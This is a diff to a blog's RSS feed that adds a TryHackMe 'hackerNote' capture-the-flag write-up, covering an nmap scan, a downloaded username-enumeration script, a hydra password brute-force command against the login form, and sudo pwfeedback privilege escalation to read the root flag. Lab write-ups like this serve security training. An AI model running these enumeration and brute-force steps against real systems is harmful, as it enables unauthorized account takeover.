@@ -16,6 +16,91 @@
       <guid>https://markramige.com/posts/tryhackme-hackernote-write-up/</guid>
       <description>This TryHackMe challenge gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute-forcing, and privilege escalation. It requires some basic linux skills to get started.
 Contents  Task 1 - Reconnaissance Task 2 - Investigate Task 3 - Exploit Task 4 - Attack Passwords Task 5 - Escalate  Task 1 - Reconnaissance  Which ports are open?</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/hackernote&#34;&gt;This TryHackMe challenge&lt;/a&gt; gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute-forcing, and privilege escalation. It requires some basic linux skills to get started.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#task-1-reconnaissance&#34;&gt;Task 1 - Reconnaissance&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-2-investigate&#34;&gt;Task 2 - Investigate&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-3-exploit&#34;&gt;Task 3 - Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-4-attack-passwords&#34;&gt;Task 4 - Attack Passwords&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-5-escalate&#34;&gt;Task 5 - Escalate&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;task-1---reconnaissance&#34;&gt;Task 1 - Reconnaissance&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Which ports are open? (in numerical order)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can run &lt;code&gt;man nmap&lt;/code&gt; to check for the options we need to scan for ports and service identification (next question).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap -A -T4 MACHINE_IP&lt;/code&gt; seems to be what we&amp;rsquo;re looking for. The output is:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2020-02-28 17:17 EST
+Nmap scan report for MACHINE_IP
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
+|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
+|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
+80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Home - hackerNote
+8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Home - hackerNote
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;What programming language is the backend written in?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Notice the service listed on port 80.&lt;/p&gt;
+&lt;h2 id=&#34;task-2---investigate&#34;&gt;Task 2 - Investigate&lt;/h2&gt;
+&lt;p&gt;Follow the instructions to set up your user account and test the web app. I&amp;rsquo;m proxying the traffic through Burp Suite.&lt;/p&gt;
+&lt;h2 id=&#34;task-3---exploit&#34;&gt;Task 3 - Exploit&lt;/h2&gt;
+&lt;p&gt;Download the &lt;a href=&#34;https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py&#34;&gt;exploit&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/names.txt&#34;&gt;list of user names&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Change the value of the URL variable in the exploit script to &lt;code&gt;&amp;quot;http://MACHINE_IP/api/user/login&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Add your user name to the top of the names.txt file to increase the accuracy of the exploit.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;python3 exploit.py&lt;/code&gt; and answer the two questions based on the output:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;How many usernames from the list are valid?&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What are/is the valid username(s)?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;task-4---attack-passwords&#34;&gt;Task 4 - Attack Passwords&lt;/h2&gt;
+&lt;p&gt;Download the wordlists.zip file. We&amp;rsquo;re running Kali Linux and the hashcat-utils package is installed so we can just run:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/hashcat-utils/combinator.bin colors.txt numbers.txt &amp;gt; wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Next we run hydra to bruteforce our passwords: (replace &lt;code&gt;USERNAME&lt;/code&gt; and &lt;code&gt;MACHINE_IP&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -l USERNAME -P wordlist.txt MACHINE_IP http-post-form &amp;quot;/api/user/login:username=^USER^&amp;amp;password=^PASS^:Invalid Username Or Password&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How many passwords were in your wordlist?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;wc -l wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What was the user&amp;rsquo;s password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Taken from the output of &lt;code&gt;hydra&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the user&amp;rsquo;s SSH password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Log in to the web app and the password is shown&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What&amp;rsquo;s the user flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;ssh USERNAME@MACHINE_IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cat user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;task-5---escalate&#34;&gt;Task 5 - Escalate&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the CVE number for the exploit?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Google &lt;code&gt;pwdfeedback&lt;/code&gt; and we &lt;a href=&#34;https://www.sudo.ws/alerts/pwfeedback.html&#34;&gt;find a page&lt;/a&gt; that explains the vulnerability and gives us the CVE number.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the root flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions on the page to download the exploit, compile it, scp to the server, and run it.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;cat /root/root.txt&lt;/code&gt; to get the flag.&lt;/p&gt;
+</content>
     </item>
     
   </channel>
